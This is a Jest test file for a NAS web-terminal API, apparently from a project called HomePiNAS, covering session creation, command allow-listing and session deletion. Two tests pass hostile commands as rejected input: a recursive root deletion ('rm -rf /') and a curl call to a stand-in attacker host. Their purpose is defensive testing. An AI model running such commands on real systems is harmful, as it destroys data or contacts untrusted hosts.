/**
 * HomePiNAS - Terminal Routes Tests
 * Tests for web terminal session management
 */

const express = require('express');
const request = require('supertest');

// Mock child_process
jest.mock('child_process', () => ({
    spawn: jest.fn(() => ({
        stdout: { on: jest.fn() },
        stderr: { on: jest.fn() },
        stdin: { write: jest.fn() },
        on: jest.fn((event, cb) => event === 'close' && cb(0)),
        kill: jest.fn(),
        killed: false,
        pid: 12345
    }))
}));

// Mock fs
jest.mock('fs', () => ({
    ...jest.requireActual('fs'),
    existsSync: jest.fn(() => true),
    readFileSync: jest.fn(() => '{}')
}));

// Mock auth middleware
jest.mock('../../middleware/auth', () => ({
    requireAuth: (req, res, next) => { req.user = { username: 'testuser' }; next(); }
}));

// Mock security
jest.mock('../../utils/security', () => ({
    logSecurityEvent: jest.fn()
}));

const { logSecurityEvent } = require('../../utils/security');

// Suppress console during tests
beforeAll(() => {
    jest.spyOn(console, 'log').mockImplementation(() => {});
    jest.spyOn(console, 'error').mockImplementation(() => {});
});

afterAll(() => {
    console.log.mockRestore();
    console.error.mockRestore();
});

// Create Express app
const terminalRouter = require('../../routes/terminal');
const app = express();
app.use(express.json());
app.use('/api/terminal', terminalRouter);

// ============================================================================
// GET /sessions
// ============================================================================

describe('GET /api/terminal/sessions', () => {
    test('returns session list', async () => {
        const res = await request(app).get('/api/terminal/sessions');
        expect(res.status).toBe(200);
        expect(Array.isArray(res.body)).toBe(true);
    });
});

// ============================================================================
// POST /session
// ============================================================================

describe('POST /api/terminal/session', () => {
    beforeEach(() => {
        jest.clearAllMocks();
    });

    test('creates new terminal session', async () => {
        const res = await request(app)
            .post('/api/terminal/session')
            .send({ command: 'bash' });
        expect(res.status).toBe(200);
        expect(res.body.sessionId).toBeDefined();
        expect(res.body.wsUrl).toContain('/ws/');
        expect(logSecurityEvent).toHaveBeenCalledWith(
            'TERMINAL_SESSION_CREATED',
            expect.anything(),
            expect.anything()
        );
    });

    test('defaults to bash', async () => {
        const res = await request(app)
            .post('/api/terminal/session')
            .send({});
        expect(res.status).toBe(200);
        expect(res.body.command).toBe('bash');
    });

    test('allows htop', async () => {
        const res = await request(app)
            .post('/api/terminal/session')
            .send({ command: 'htop' });
        expect(res.status).toBe(200);
        expect(res.body.command).toBe('htop');
    });

    test('allows docker command', async () => {
        const res = await request(app)
            .post('/api/terminal/session')
            .send({ command: 'docker stats' });
        expect(res.status).toBe(200);
    });

    test('rejects dangerous commands', async () => {
        const res = await request(app)
            .post('/api/terminal/session')
            .send({ command: 'rm -rf /' });
        expect(res.status).toBe(400);
        expect(res.body.error).toContain('not allowed');
    });

    test('rejects unknown commands', async () => {
        const res = await request(app)
            .post('/api/terminal/session')
            .send({ command: 'curl http://evil.com' });
        expect(res.status).toBe(400);
    });
});

// ============================================================================
// DELETE /session/:id
// ============================================================================

describe('DELETE /api/terminal/session/:id', () => {
    beforeEach(() => {
        jest.clearAllMocks();
    });

    test('rejects invalid session ID format', async () => {
        const res = await request(app).delete('/api/terminal/session/invalid-id');
        expect(res.status).toBe(400);
        expect(res.body.error).toContain('Invalid');
    });

    test('returns 404 for non-existent session', async () => {
        const res = await request(app).delete('/api/terminal/session/term-12345-abcdefghi');
        expect(res.status).toBe(404);
    });
});

// ============================================================================
// GET /commands
// ============================================================================

describe('GET /api/terminal/commands', () => {
    test('returns allowed commands list', async () => {
        const res = await request(app).get('/api/terminal/commands');
        expect(res.status).toBe(200);
        expect(res.body).toHaveProperty('allowed');
        expect(res.body).toHaveProperty('presets');
        expect(Array.isArray(res.body.allowed)).toBe(true);
        expect(res.body.allowed).toContain('bash');
        expect(res.body.allowed).toContain('htop');
        expect(res.body.allowed).toContain('docker');
    });
});
